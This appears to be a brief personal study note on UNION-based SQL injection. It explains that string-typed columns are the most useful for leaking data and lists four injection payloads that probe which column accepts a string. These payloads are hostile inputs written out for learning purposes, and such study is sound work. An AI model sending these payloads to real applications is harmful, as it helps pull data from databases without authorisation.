
> [!important] 
> Most useful information to leak is usually is a string-type data, so we can check what field is a string (after consider how many fields there are ofc) 

> [!example] 
> ' UNION SELECT 'a',NULL,NULL,NULL--
> ' UNION SELECT NULL,'a',NULL,NULL--
> ' UNION SELECT NULL,NULL,'a',NULL--
> ' UNION SELECT NULL,NULL,NULL,'a'--
